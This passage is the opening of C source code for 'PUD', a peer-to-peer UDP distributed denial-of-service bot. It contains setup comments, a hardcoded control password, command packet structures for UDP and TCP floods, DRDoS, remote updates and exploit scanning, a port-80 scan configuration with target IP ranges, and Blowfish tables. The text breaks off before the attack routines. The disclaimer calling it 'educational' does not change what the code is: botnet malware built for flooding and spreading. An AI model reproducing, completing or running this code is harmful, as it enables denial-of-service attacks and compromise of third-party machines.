/****************************************************************************
 *                                                                          *
 *           Peer to peer UDP Distributed Denial of Service (PUD)           *
 *                               by contem                                  *
 *                                                                          *
 *         Virtually connects computers via the udp protocol on the         *
 *  specified port.  Uses a newly created peer-to-peer protocol that        *
 *  incorperates uses on unstable or dead computers.  The program is        *
 *  ran with the parameters of another ip on the virtual network.  If       *
 *  running on the first computer, run with the ip 127.0.0.1 or some        *
 *  other type of local address.  Ex:                                       *
 *                                                                          *
 *                   Computer A:   ./pud 127.0.0.1                          *
 *                   Computer B:   ./pud Computer_A                         *
 *                   Computer C:   ./pud Computer_A                         *
 *                   Computer D:   ./pud Computer_C                         *
 *                                                                          *
 *         Any form of that will work.  The linking process works by        *
 *  giving each computer the list of avaliable computers, then              *
 *  using a technique called broadcast segmentation combined with TCP       *
 *  like functionality to insure that another computer on the network       *
 *  receives the broadcast packet, segments it again and recreates          *
 *  the packet to send to other hosts.  That technique can be used to       *
 *  support over 16 million simutaniously connected computers.              *
 *                                                                          *
 *         I am not responsible for any harm caused by this program!        *
 *  I made this program to demonstrate peer-to-peer communication and       *
 *  should not be used in real life.  It is an education program that       *
 *  should never even be ran at all, nor used in any way, shape or          *
 *  form.  It is not the authors fault if it was used for any purposes      *
 *  other than educational.                                                 *
 *                                                                          *
 *  TODO:                                                                   *
 *     - Add ip deleting functionality                                      *
 *     - Add random porting                                                 *
 *     - Fix bouncing functions                                             *
 *     - Debug debug debug debug debug debug debug                          *
 *                                                                          *
 ****************************************************************************/

char *PASSWORD="fearthis"; // EDIT THIS 

//////////////////////////////////////////////////////////////////////////////////////
//                                DONT EDIT                                         //
//////////////////////////////////////////////////////////////////////////////////////

#define __FAVOR_BSD
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>

#ifdef WIN32
#include <windows.h>
#include <time.h>
#define bcopy(a,b,c) memcpy(b,a,c)
#define sleep(x) Sleep(x*1000)
#define usleep(x) Sleep(x)
typedef unsigned long u_int32_t;
char *EXTERNAL_BASE="XXXXXXXXXXXXXXXXXXXXXXXX";
#else
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <errno.h>
#include <netdb.h>
#include <sys/wait.h>
#include <signal.h>
#include <netinet/in.h>
#endif

#define PORT		2015
#define VERSION		28112002

#define LINKS		128
#define CLIENTS		128
#define MAXPATH		4096
#define LINEMAX		4096
#define MAXBUF		9000
#define ESCANPORT	10100

#define SCAN
#define SCANPORT	80
#define SCANTIMEOUT	5

#undef DEBUG

#ifdef WIN32
#undef DEBUG
#undef SCAN
#endif

#ifdef DEBUG
struct CServers { char *ip; unsigned short port; } servers[] = {
	{ "1.5.4.3", PORT },
	{ "5.1.3.1", 2000 },
{ (char *)0, 0 } };
#define Log printf
#endif

//////////////////////////////////////////////////////////////////////////////////////
//                                  Macros                                          //
//////////////////////////////////////////////////////////////////////////////////////

enum { WINDOWS=1, LINUX, NETBSD, OPENBSD, FREEBSD, SOLARIS, IRIX, HP, UNIX };

#ifdef WIN32
HANDLE hHeap;
#define myfree(x) {if (x) { HeapFree(hHeap,0,x);x=NULL; }}
#define myalloc(x) HeapAlloc(hHeap,0,x);
#define myrealloc(x,y) HeapReAlloc(hHeap,0,x,y);
#else
#define myfree(x) {if (x) { free(x);x=NULL; }}
#define myalloc(x) malloc(x);
#define myrealloc(x,y) realloc(x,y);
#define myfork() fork()
#endif

enum { TCP_PENDING=1, TCP_CONNECTED=2, SOCKS_REPLY=3 };
enum { ASUCCESS=0, ARESOLVE, ACONNECT, ASOCKET, ABIND, AINUSE, APENDING, AINSTANCE, AUNKNOWN };
enum { AREAD=1, AWRITE=2, AEXCEPT=4 };

//////////////////////////////////////////////////////////////////////////////////////
//                                  Packet headers                                  //
//////////////////////////////////////////////////////////////////////////////////////

struct llheader {
	char type;
	unsigned long cancelation;
	unsigned long checksum;
	unsigned long id;
};
struct header {
	char tag;
	int id;
	unsigned long len;
	unsigned long seq;
};
struct route_rec {
	struct header h;
	char sync;
	unsigned long server;
	unsigned long links;
	unsigned long seglinks;
	unsigned long start;
	unsigned long end;
	char ttag;
};
struct kill_rec {
	struct header h;
};
struct sh_rec {
	struct header h;
};
struct list_rec {
	struct header h;
};
struct udp_rec {
	struct header h;
	unsigned long size;
	unsigned long target;
	unsigned short port;
	unsigned long secs;
};
struct tcp_rec {
	struct header h;
	unsigned long target;
	unsigned short port;
	unsigned long secs;
};
struct tcp6_rec {
	struct header h;
	unsigned long target[4];
	unsigned short port;
	unsigned long secs;
};
struct drdos_rec {
	struct header h;
	unsigned long target;
	unsigned long secs;
};
struct df_rec {
	struct header h;
	unsigned long target;
	unsigned long secs;
};
struct add_rec {
	struct header h;
	unsigned long server;
	unsigned long socks;
	unsigned long bind;
	unsigned short port;
};
struct data_rec {
	struct header h;
};
struct addsrv_rec {
	struct header h;
};
struct initsrv_rec {
	struct header h;
};
struct qmyip_rec {
	struct header h;
};
struct myip_rec {
	struct header h;
	unsigned long ip;
};
struct escan_rec {
	struct header h;
	unsigned long ip;
};
struct getinfo_rec {
	struct header h;
	unsigned long time;
	unsigned long mtime;
};
struct info_rec {
	struct header h;
	unsigned char a;
	unsigned char b;
	unsigned char c;
	unsigned char d;
	unsigned char os;
	unsigned long ip;
	unsigned long reqtime;
	unsigned long reqmtime;
	unsigned long version;
	unsigned short hostlen;
};
struct update_rec {
	struct header h;
	unsigned long base;
	unsigned long version;
	unsigned char os;
};

//////////////////////////////////////////////////////////////////////////////////////
//                             Public variables                                     //
//////////////////////////////////////////////////////////////////////////////////////

struct ainst {
	void *ext,*ext5;
	int ext2,ext3,ext4;

	int sock,error;
	unsigned long len;
	struct sockaddr_in in;
};
struct ainst clients[CLIENTS*2];
struct ainst udpclient,udpserver;
unsigned int sseed=0,myos=0,parent=0;
struct route_table {
	int id;
	unsigned long ip;
	unsigned short port;
} routes[LINKS];
unsigned long numlinks, *links=NULL, myip=0;
unsigned long sequence[LINKS], rsa[LINKS];
struct _pids {
	int id;
#ifdef WIN32
	HANDLE handle;
#endif
	unsigned char type;

	void (*func)(struct ainst *, unsigned char *, unsigned long);
	struct ainst *udpclient;
	unsigned char *buf;
	unsigned long len;

	struct _pids *next;
} *pids=NULL;
unsigned long synctime=0;
#ifdef DEBUG
unsigned long myport=0;
#endif

struct mqueue {
	char *packet;
	unsigned long len;
	unsigned long id;
	unsigned long time;
	unsigned long ltime;
	unsigned long destination;
	unsigned short port;
	char trys,type;
	unsigned long start;
	unsigned long split;
	unsigned long end;
	struct mqueue *next;
} *queues=NULL;

#ifdef SCAN
unsigned char classes[] = { 3, 4, 6, 8, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 26, 28, 29, 30, 32, 33, 34, 35, 38, 40, 43, 44, 45,
	46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 61, 62, 63, 64, 65, 66, 67, 68, 80, 81, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138,
	139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167,
	168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196,
	198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 224, 225, 226, 227, 228, 229,
	230, 231, 232, 233, 234, 235, 236, 237, 238, 239 };
unsigned char a=0,b=0,c=0,d=0;
#endif

#ifdef WIN32
HANDLE hMutexDelqueue, hMutexLowsend, hMutexResendQueue;
#endif

//////////////////////////////////////////////////////////////////////////////////////
//                                     Blowfish                                     //
//      NOTE: THIS IS A SECTION OF THE SOURCE CODE THAT I DID NOT CREATE.           //
//            BLOWFISH IS PUBLIC DOMAIN AND HAS BEEN EDITED TO FIT PUD.             //
//////////////////////////////////////////////////////////////////////////////////////

#define bf_N             16
#define UBYTE_08bits  unsigned char
#define UWORD_16bits  unsigned short
#define UWORD_32bits  unsigned long

#ifdef WORDS_BIGENDIAN
union aword {
  UWORD_32bits word;
  UBYTE_08bits byte [4];
  struct {
    unsigned int byte0:8;
    unsigned int byte1:8;
    unsigned int byte2:8;
    unsigned int byte3:8;
  } w;
};
#else
union aword {
  UWORD_32bits word;
  UBYTE_08bits byte [4];
  struct {
    unsigned int byte3:8;
    unsigned int byte2:8;
    unsigned int byte1:8;
    unsigned int byte0:8;
  } w;
};
#endif

static UWORD_32bits initbf_P[bf_N + 2] = {
  0x243f6a88, 0x85a308d3, 0x13198a2e, 0x03707344,
  0xa4093822, 0x299f31d0, 0x082efa98, 0xec4e6c89,
  0x452821e6, 0x38d01377, 0xbe5466cf, 0x34e90c6c,
  0xc0ac29b7, 0xc97c50dd, 0x3f84d5b5, 0xb5470917,
  0x9216d5d9, 0x8979fb1b,
};
static UWORD_32bits initbf_S[4][256] = {
  {
  0xd1310ba6, 0x98dfb5ac, 0x2ffd72db, 0xd01adfb7,
  0xb8e1afed, 0x6a267e96, 0xba7c9045, 0xf12c7f99,
  0x24a19947, 0xb3916cf7, 0x0801f2e2, 0x858efc16,
  0x636920d8, 0x71574e69, 0xa458fea3, 0xf4933d7e,
  0x0d95748f, 0x728eb658, 0x718bcd58, 0x82154aee,
  0x7b54a41d, 0xc25a59b5, 0x9c30d539, 0x2af26013,
  0xc5d1b023, 0x286085f0, 0xca417918, 0xb8db38ef,
  0x8e79dcb0, 0x603a180e, 0x6c9e0e8b, 0xb01e8a3e,
  0xd71577c1, 0xbd314b27, 0x78af2fda, 0x55605c60,
  0xe65525f3, 0xaa55ab94, 0x57489862, 0x63e81440,
  0x55ca396a, 0x2aab10b6, 0xb4cc5c34, 0x1141e8ce,
  0xa15486af, 0x7c72e993, 0xb3ee1411, 0x636fbc2a,
  0x2ba9c55d, 0x741831f6, 0xce5c3e16, 0x9b87931e,
  0xafd6ba33, 0x6c24cf5c, 0x7a325381, 0x28958677,
  0x3b8f4898, 0x6b4bb9af, 0xc4bfe81b, 0x66282193,
  0x61d809cc, 0xfb21a991, 0x487cac60, 0x5dec8032,
  0xef845d5d, 0xe98575b1, 0xdc262302, 0xeb651b88,
  0x23893e81, 0xd396acc5, 0x0f6d6ff3, 0x83f44239,
  0x2e0b4482, 0xa4842004, 0x69c8f04a, 0x9e1f9b5e,
  0x21c66842, 0xf6e96c9a, 0x670c9c61, 0xabd388f0,
  0x6a51a0d2, 0xd8542f68, 0x960fa728, 0xab5133a3,
  0x6eef0b6c, 0x137a3be4, 0xba3bf050, 0x7efb2a98,
  0xa1f1651d, 0x39af0176, 0x66ca593e, 0x82430e88,
  0x8cee8619, 0x456f9fb4, 0x7d84a5c3, 0x3b8b5ebe,
  0xe06f75d8, 0x85c12073, 0x401a449f, 0x56c16aa6,
  0x4ed3aa62, 0x363f7706, 0x1bfedf72, 0x429b023d,
  0x37d0d724, 0xd00a1248, 0xdb0fead3, 0x49f1c09b,
  0x075372c9, 0x80991b7b, 0x25d479d8, 0xf6e8def7,
  0xe3fe501a, 0xb6794c3b, 0x976ce0bd, 0x04c006ba,
  0xc1a94fb6, 0x409f60c4, 0x5e5c9ec2, 0x196a2463,
  0x68fb6faf, 0x3e6c53b5, 0x1339b2eb, 0x3b52ec6f,
  0x6dfc511f, 0x9b30952c, 0xcc814544, 0xaf5ebd09,
  0xbee3d004, 0xde334afd, 0x660f2807, 0x192e4bb3,
  0xc0cba857, 0x45c8740f, 0xd20b5f39, 0xb9d3fbdb,
  0x5579c0bd, 0x1a60320a, 0xd6a100c6, 0x402c7279,
  0x679f25fe, 0xfb1fa3cc, 0x8ea5e9f8, 0xdb3222f8,
  0x3c7516df, 0xfd616b15, 0x2f501ec8, 0xad0552ab,
  0x323db5fa, 0xfd238760, 0x53317b48, 0x3e00df82,
  0x9e5c57bb, 0xca6f8ca0, 0x1a87562e, 0xdf1769db,
  0xd542a8f6, 0x287effc3, 0xac6732c6, 0x8c4f5573,
  0x695b27b0, 0xbbca58c8, 0xe1ffa35d, 0xb8f011a0,
  0x10fa3d98, 0xfd2183b8, 0x4afcb56c, 0x2dd1d35b,
  0x9a53e479, 0xb6f84565, 0xd28e49bc, 0x4bfb9790,
  0xe1ddf2da, 0xa4cb7e33, 0x62fb1341, 0xcee4c6e8,
  0xef20cada, 0x36774c01, 0xd07e9efe, 0x2bf11fb4,
  0x95dbda4d, 0xae909198, 0xeaad8e71, 0x6b93d5a0,
  0xd08ed1d0, 0xafc725e0, 0x8e3c5b2f, 0x8e7594b7,
  0x8ff6e2fb, 0xf2122b64, 0x8888b812, 0x900df01c,
  0x4fad5ea0, 0x688fc31c, 0xd1cff191, 0xb3a8c1ad,
  0x2f2f2218, 0xbe0e1777, 0xea752dfe, 0x8b021fa1,
  0xe5a0cc0f, 0xb56f74e8, 0x18acf3d6, 0xce89e299,
  0xb4a84fe0, 0xfd13e0b7, 0x7cc43b81, 0xd2ada8d9,
  0x165fa266, 0x80957705, 0x93cc7314, 0x211a1477,
  0xe6ad2065, 0x77b5fa86, 0xc75442f5, 0xfb9d35cf,
  0xebcdaf0c, 0x7b3e89a0, 0xd6411bd3, 0xae1e7e49,
  0x00250e2d, 0x2071b35e, 0x226800bb, 0x57b8e0af,
  0x2464369b, 0xf009b91e, 0x5563911d, 0x59dfa6aa,
  0x78c14389, 0xd95a537f, 0x207d5ba2, 0x02e5b9c5,
  0x83260376, 0x6295cfa9, 0x11c81968, 0x4e734a41,
  0xb3472dca, 0x7b14a94a, 0x1b510052, 0x9a532915,
  0xd60f573f, 0xbc9bc6e4, 0x2b60a476, 0x81e67400,
  0x08ba6fb5, 0x571be91f, 0xf296ec6b, 0x2a0dd915,
  0xb6636521, 0xe7b9f9b6, 0xff34052e, 0xc5855664,
  0x53b02d5d, 0xa99f8fa1, 0x08ba4799, 0x6e85076a },
  {
  0x4b7a70e9, 0xb5b32944, 0xdb75092e, 0xc4192623,
  0xad6ea6b0, 0x49a7df7d, 0x9cee60b8, 0x8fedb266,
  0xecaa8c71, 0x699a17ff, 0x5664526c, 0xc2b19ee1,
  0x193602a5, 0x75094c29, 0xa0591340, 0xe4183a3e,
  0x3f54989a, 0x5b429d65, 0x6b8fe4d6, 0x99f73fd6,
  0xa1d29c07, 0xefe830f5, 0x4d2d38e6, 0xf0255dc1,
  0x4cdd2086, 0x8470eb26, 0x6382e9c6, 0x021ecc5e,
  0x09686b3f, 0x3ebaefc9, 0x3c971814, 0x6b6a70a1,
  0x687f3584, 0x52a0e286, 0xb79c5305, 0xaa500737,
  0x3e07841c, 0x7fdeae5c, 0x8e7d44ec, 0x5716f2b8,
  0xb03ada37, 0xf0500c0d, 0xf01c1f04, 0x0200b3ff,
  0xae0cf51a, 0x3cb574b2, 0x25837a58, 0xdc0921bd,
  0xd19113f9, 0x7ca92ff6, 0x94324773, 0x22f54701,
  0x3ae5e581, 0x37c2dadc, 0xc8b57634, 0x9af3dda7,
  0xa9446146, 0x0fd0030e, 0xecc8c73e, 0xa4751e41,
  0xe238cd99, 0x3bea0e2f, 0x3280bba1, 0x183eb331,
  0x4e548b38, 0x4f6db908, 0x6f420d03, 0xf60a04bf,
  0x2cb81290, 0x24977c79, 0x5679b072, 0xbcaf89af,
  0xde9a771f, 0xd9930810, 0xb38bae12, 0xdccf3f2e,
  0x5512721f, 0x2e6b7124, 0x501adde6, 0x9f84cd87,
  0x7a584718, 0x7408da17, 0xbc9f9abc, 0xe94b7d8c,
  0xec7aec3a, 0xdb851dfa, 0x63094366, 0xc464c3d2,
  0xef1c1847, 0x3215d908, 0xdd433b37, 0x24c2ba16,
  0x12a14d43, 0x2a65c451, 0x50940002, 0x133ae4dd,
  0x71dff89e, 0x10314e55, 0x81ac77d6, 0x5f11199b,
  0x043556f1, 0xd7a3c76b, 0x3c11183b, 0x5924a509,
  0xf28fe6ed, 0x97f1fbfa, 0x9ebabf2c, 0x1e153c6e,
  0x86e34570, 0xeae96fb1, 0x860e5e0a, 0x5a3e2ab3,
  0x771fe71c, 0x4e3d06fa, 0x2965dcb9, 0x99e71d0f,
  0x803e89d6, 0x5266c825, 0x2e4cc978, 0x9c10b36a,
  0xc6150eba, 0x94e2ea78, 0xa5fc3c53, 0x1e0a2df4,
  0xf2f74ea7, 0x361d2b3d, 0x1939260f, 0x19c27960,
  0x5223a708, 0xf71312b6, 0xebadfe6e, 0xeac31f66,
  0xe3bc4595, 0xa67bc883, 0xb17f37d1, 0x018cff28,
  0xc332ddef, 0xbe6c5aa5, 0x65582185, 0x68ab9802,
  0xeecea50f, 0xdb2f953b, 0x2aef7dad, 0x5b6e2f84,
  0x1521b628, 0x29076170, 0xecdd4775, 0x619f1510,
  0x13cca830, 0xeb61bd96, 0x0334fe1e, 0xaa0363cf,
  0xb5735c90, 0x4c70a239, 0xd59e9e0b, 0xcbaade14,
  0xeecc86bc, 0x60622ca7, 0x9cab5cab, 0xb2f3846e,
  0x648b1eaf, 0x19bdf0ca, 0xa02369b9, 0x655abb50,
  0x40685a32, 0x3c2ab4b3, 0x319ee9d5, 0xc021b8f7,
  0x9b540b19, 0x875fa099, 0x95f7997e, 0x623d7da8,
  0xf837889a, 0x97e32d77, 0x11ed935f, 0x16681281,
  0x0e358829, 0xc7e61fd6, 0x96dedfa1, 0x7858ba99,
  0x57f584a5, 0x1b227263, 0x9b83c3ff, 0x1ac24696,
  0xcdb30aeb, 0x532e3054, 0x8fd948e4, 0x6dbc3128,
  0x58ebf2ef, 0x34c6ffea, 0xfe28ed61, 0xee7c3c73,
  0x5d4a14d9, 0xe864b7e3, 0x42105d14, 0x203e13e0,
  0x45eee2b6, 0xa3aaabea, 0xdb6c4f15, 0xfacb4fd0,
  0xc742f442, 0xef6abbb5, 0x654f3b1d, 0x41cd2105,
  0xd81e799e, 0x86854dc7, 0xe44b476a, 0x3d816250,
  0xcf62a1f2, 0x5b8d2646, 0xfc8883a0, 0xc1c7b6a3,
  0x7f1524c3, 0x69cb7492, 0x47848a0b, 0x5692b285,
  0x095bbf00, 0xad19489d, 0x1462b174, 0x23820e00,
  0x58428d2a, 0x0c55f5ea, 0x1dadf43e, 0x233f7061,
  0x3372f092, 0x8d937e41, 0xd65fecf1, 0x6c223bdb,
  0x7cde3759, 0xcbee7460, 0x4085f2a7, 0xce77326e,
  0xa6078084, 0x19f8509e, 0xe8efd855, 0x61d99735,
  0xa969a7aa, 0xc50c06c2, 0x5a04abfc, 0x800bcadc,
  0x9e447a2e, 0xc3453484, 0xfdd56705, 0x0e1e9ec9,
  0xdb73dbd3, 0x105588cd, 0x675fda79, 0xe3674340,
  0xc5c43465, 0x713e38d8, 0x3d28f89e, 0xf16dff20,
  0x153e21e7, 0x8fb03d4a, 0xe6e39f2b, 0xdb83adf7 },
  {
  0xe93d5a68, 0x948140f7, 0xf64c261c, 0x94692934,
  0x411520f7, 0x7602d4f7, 0xbcf46b2e, 0xd4a20068,
  0xd4082471, 0x3320f46a, 0x43b7d4b7, 0x500061af,
  0x1e39f62e, 0x97244546, 0x14214f74, 0xbf8b8840,
  0x4d95fc1d, 0x96b591af, 0x70f4ddd3, 0x66a02f45,
  0xbfbc09ec, 0x03bd9785, 0x7fac6dd0, 0x31cb8504,
  0x96eb27b3, 0x55fd3941, 0xda2547e6, 0xabca0a9a,
  0x28507825, 0x530429f4, 0x0a2c86da, 0xe9b66dfb,
  0x68dc1462, 0xd7486900, 0x680ec0a4, 0x27a18dee,
  0x4f3ffea2, 0xe887ad8c, 0xb58ce006, 0x7af4d6b6,
  0xaace1e7c, 0xd3375fec, 0xce78a399, 0x406b2a42,
  0x20fe9e35, 0xd9f385b9, 0xee39d7ab, 0x3b124e8b,
  0x1dc9faf7, 0x4b6d1856, 0x26a36631, 0xeae397b2,
  0x3a6efa74, 0xdd5b4332, 0x6841e7f7, 0xca7820fb,
  0xfb0af54e, 0xd8feb397, 0x454056ac, 0xba489527,
  0x55533a3a, 0x20838d87, 0xfe6ba9b7, 0xd096954b,
  0x55a867bc, 0xa1159a58, 0xcca92963, 0x99e1db33,
  0xa62a4a56, 0x3f3125f9, 0x5ef47e1c, 0x9029317c,
  0xfdf8e802, 0x04272f70, 0x80bb155c, 0x05282ce3,
  0x95c11548, 0xe4c66d22, 0x48c1133f, 0xc70f86dc,
  0x07f9c9ee, 0x41041f0f, 0x404779a4, 0x5d886e17,
  0x325f51eb, 0xd59bc0d1, 0xf2bcc18f, 0x41113564,
  0x257b7834, 0x602a9c60, 0xdff8e8a3, 0x1f636c1b,
  0x0e12b4c2, 0x02e1329e, 0xaf664fd1, 0xcad18115,
  0x6b2395e0, 0x333e92e1, 0x3b240b62, 0xeebeb922,
  0x85b2a20e, 0xe6ba0d99, 0xde720c8c, 0x2da2f728,
  0xd0127845, 0x95b794fd, 0x647d0862, 0xe7ccf5f0,
  0x5449a36f, 0x877d48fa, 0xc39dfd27, 0xf33e8d1e,
  0x0a476341, 0x992eff74, 0x3a6f6eab, 0xf4f8fd37,
  0xa812dc60, 0xa1ebddf8, 0x991be14c, 0xdb6e6b0d,
  0xc67b5510, 0x6d672c37, 0x2765d43b, 0xdcd0e804,
  0xf1290dc7, 0xcc00ffa3, 0xb5390f92, 0x690fed0b,
  0x667b9ffb, 0xcedb7d9c, 0xa091cf0b, 0xd9155ea3,
  0xbb132f88, 0x515bad24, 0x7b9479bf, 0x763bd6eb,
  0x37392eb3, 0xcc115979, 0x8026e297, 0xf42e312d,
  0x6842ada7, 0xc66a2b3b, 0x12754ccc, 0x782ef11c,
  0x6a124237, 0xb79251e7, 0x06a1bbe6, 0x4bfb6350,
  0x1a6b1018, 0x11caedfa, 0x3d25bdd8, 0xe2e1c3c9,
  0x44421659, 0x0a121386, 0xd90cec6e, 0xd5abea2a,
  0x64af674e, 0xda86a85f, 0xbebfe988, 0x64e4c3fe,
  0x9dbc8057, 0xf0f7c086, 0x60787bf8, 0x6003604d,
  0xd1fd8346, 0xf6381fb0, 0x7745ae04, 0xd736fccc,
  0x83426b33, 0xf01eab71, 0xb0804187, 0x3c005e5f,
  0x77a057be, 0xbde8ae24, 0x55464299, 0xbf582e61,
  0x4e58f48f, 0xf2ddfda2, 0xf474ef38, 0x8789bdc2,
  0x5366f9c3, 0xc8b38e74, 0xb475f255, 0x46fcd9b9,
  0x7aeb2661, 0x8b1ddf84, 0x846a0e79, 0x915f95e2,
  0x466e598e, 0x20b45770, 0x8cd55591, 0xc902de4c,
  0xb90bace1, 0xbb8205d0, 0x11a86248, 0x7574a99e,
  0xb77f19b6, 0xe0a9dc09, 0x662d09a1, 0xc4324633,
  0xe85a1f02, 0x09f0be8c, 0x4a99a025, 0x1d6efe10,
  0x1ab93d1d, 0x0ba5a4df, 0xa186f20f, 0x2868f169,
  0xdcb7da83, 0x573906fe, 0xa1e2ce9b, 0x4fcd7f52,
  0x50115e01, 0xa70683fa, 0xa002b5c4, 0x0de6d027,
  0x9af88c27, 0x773f8641, 0xc3604c06, 0x61a806b5,
  0xf0177a28, 0xc0f586e0, 0x006058aa, 0x30dc7d62,
  0x11e69ed7, 0x2338ea63, 0x53c2dd94, 0xc2c21634,
  0xbbcbee56, 0x90bcb6de, 0xebfc7da1, 0xce591d76,
  0x6f05e409, 0x4b7c0188, 0x39720a3d, 0x7c927c24,
  0x86e3725f, 0x724d9db9, 0x1ac15bb4, 0xd39eb8fc,
  0xed545578, 0x08fca5b5, 0xd83d7cd3, 0x4dad0fc4,
  0x1e50ef5e, 0xb161e6f8, 0xa28514d9, 0x6c51133c,
  0x6fd5c7e7, 0x56e14ec4, 0x362abfce, 0xddc6c837,
  0xd79a3234, 0x92638212, 0x670efa8e, 0x406000e0 },
  {
  0x3a39ce37, 0xd3faf5cf, 0xabc27737, 0x5ac52d1b,
  0x5cb0679e, 0x4fa33742, 0xd3822740, 0x99bc9bbe,
  0xd5118e9d, 0xbf0f7315, 0xd62d1c7e, 0xc700c47b,
  0xb78c1b6b, 0x21a19045, 0xb26eb1be, 0x6a366eb4,
  0x5748ab2f, 0xbc946e79, 0xc6a376d2, 0x6549c2c8,
  0x530ff8ee, 0x468dde7d, 0xd5730a1d, 0x4cd04dc6,
  0x2939bbdb, 0xa9ba4650, 0xac9526e8, 0xbe5ee304,
  0xa1fad5f0, 0x6a2d519a, 0x63ef8ce2, 0x9a86ee22,
  0xc089c2b8, 0x43242ef6, 0xa51e03aa, 0x9cf2d0a4,
  0x83c061ba, 0x9be96a4d, 0x8fe51550, 0xba645bd6,
  0x2826a2f9, 0xa73a3ae1, 0x4ba99586, 0xef5562e9,
  0xc72fefd3, 0xf752f7da, 0x3f046f69, 0x77fa0a59,
  0x80e4a915, 0x87b08601, 0x9b09e6ad, 0x3b3ee593,
  0xe990fd5a, 0x9e34d797, 0x2cf0b7d9, 0x022b8b51,
  0x96d5ac3a, 0x017da67d, 0xd1cf3ed6, 0x7c7d2d28,
  0x1f9f25cf, 0xadf2b89b, 0x5ad6b472, 0x5a88f54c,
  0xe029ac71, 0xe019a5e6, 0x47b0acfd, 0xed93fa9b,
  0xe8d3c48d, 0x283b57cc, 0xf8d56629, 0x79132e28,
  0x785f0191, 0xed756055, 0xf7960e44, 0xe3d35e8c,
  0x15056dd4, 0x88f46dba, 0x03a16125, 0x0564f0bd,
  0xc3eb9e15, 0x3c9057a2, 0x97271aec, 0xa93a072a,
  0x1b3f6d9b, 0x1e6321f5, 0xf59c66fb, 0x26dcf319,
  0x7533d928, 0xb155fdf5, 0x03563482, 0x8aba3cbb,
  0x28517711, 0xc20ad9f8, 0xabcc5167, 0xccad925f,
  0x4de81751, 0x3830dc8e, 0x379d5862, 0x9320f991,
  0xea7a90c2, 0xfb3e7bce, 0x5121ce64, 0x774fbe32,
  0xa8b6e37e, 0xc3293d46, 0x48de5369, 0x6413e680,
  0xa2ae0810, 0xdd6db224, 0x69852dfd, 0x09072166,
  0xb39a460a, 0x6445c0dd, 0x586cdecf, 0x1c20c8ae,
  0x5bbef7dd, 0x1b588d40, 0xccd2017f, 0x6bb4e3bb,
  0xdda26a7e, 0x3a59ff45, 0x3e350a44, 0xbcb4cdd5,
  0x72eacea8, 0xfa6484bb, 0x8d6612ae, 0xbf3c6f47,
  0xd29be463, 0x542f5d9e, 0xaec2771b, 0xf64e6370,
  0x740e0d8d, 0xe75b1357, 0xf8721671, 0xaf537d5d,
  0x4040cb08, 0x4eb4e2cc, 0x34d2466a, 0x0115af84,
  0xe1b00428, 0x95983a1d, 0x06b89fb4, 0xce6ea048,
  0x6f3f3b82, 0x3520ab82, 0x011a1d4b, 0x277227f8,
  0x611560b1, 0xe7933fdc, 0xbb3a792b, 0x344525bd,
  0xa08839e1, 0x51ce794b, 0x2f32c9b7, 0xa01fbac9,
  0xe01cc87e, 0xbcc7d1f6, 0xcf0111c3, 0xa1e8aac7,
  0x1a908749, 0xd44fbd9a, 0xd0dadecb, 0xd50ada38,
  0x0339c32a, 0xc6913667, 0x8df9317c, 0xe0b12b4f,
  0xf79e59b7, 0x43f5bb3a, 0xf2d519ff, 0x27d9459c,
  0xbf97222c, 0x15e6fc2a, 0x0f91fc71, 0x9b941525,
  0xfae59361, 0xceb69ceb, 0xc2a86459, 0x12baa8d1,
  0xb6c1075e, 0xe3056a0c, 0x10d25065, 0xcb03a442,
  0xe0ec6e0e, 0x1698db3b, 0x4c98a0be, 0x3278e964,
  0x9f1f9532, 0xe0d392df, 0xd3a0342b, 0x8971f21e,
  0x1b0a7441, 0x4ba3348c, 0xc5be7120, 0xc37632d8,
  0xdf359f8d, 0x9b992f2e, 0xe60b6f47, 0x0fe3f11d,
  0xe54cda54, 0x1edad891, 0xce6279cf, 0xcd3e7e6f,
  0x1618b166, 0xfd2c1d05, 0x848fd2c5, 0xf6fb2299,
  0xf523f357, 0xa6327623, 0x93a83531, 0x56cccd02,
  0xacf08162, 0x5a75ebb5, 0x6e163697, 0x88d273cc,
  0xde966292, 0x81b949d0, 0x4c50901b, 0x71c65614,
  0xe6c6c7bd, 0x327a140a, 0x45e1d006, 0xc3f27b9a,
  0xc9aa53fd, 0x62a80f00, 0xbb25bfe2, 0x35bdd2f6,
  0x71126905, 0xb2040222, 0xb6cbcf7c, 0xcd769c2b,
  0x53113ec0, 0x1640e3d3, 0x38abbd60, 0x2547adf0,
  0xba38209c, 0xf746ce76, 0x77afa1c5, 0x20756060,
  0x85cbfe4e, 0x8ae88dd8, 0x7aaaf9b0, 0x4cf9aa7e,
  0x1948c25c, 0x02fb8a8c, 0x01c36ae4, 0xd6ebe1f9,
  0x90d4f869, 0xa65cdea0, 0x3f09252d, 0xc208e69f,
  0xb74e6132, 0xce77e25b, 0x578fdfe3, 0x3ac372e6 }
};

#define BOXES  3

#define S0(x) (bf_S[0][x.w.byte0])
#define S1(x) (bf_S[1][x.w.byte1])
#define S2(x) (bf_S[2][x.w.byte2])
#define S3(x) (bf_S[3][x.w.byte3])
#define bf_F(x) (((S0(x) + S1(x)) ^ S2(x)) + S3(x))
#define ROUND(a,b,n) (a.word ^= bf_F(b) ^ bf_P[n])

struct box_t {
  UWORD_32bits *P;
  UWORD_32bits **S;
  char key[81];
  char keybytes;
  time_t lastuse;
} box[BOXES];

static UWORD_32bits *bf_P;
static UWORD_32bits **bf_S;

#ifndef u1byte
typedef unsigned char u1byte;
typedef unsigned short u2byte;
typedef unsigned long u4byte;
typedef signed char s1byte;
typedef signed short s2byte;
typedef signed long s4byte;
#endif

void init_blowfish() {
	int i;
	for (i=0; i<BOXES; i++) {
		box[i].P=NULL;
		box[i].S=NULL;
		box[i].key[0]=0;
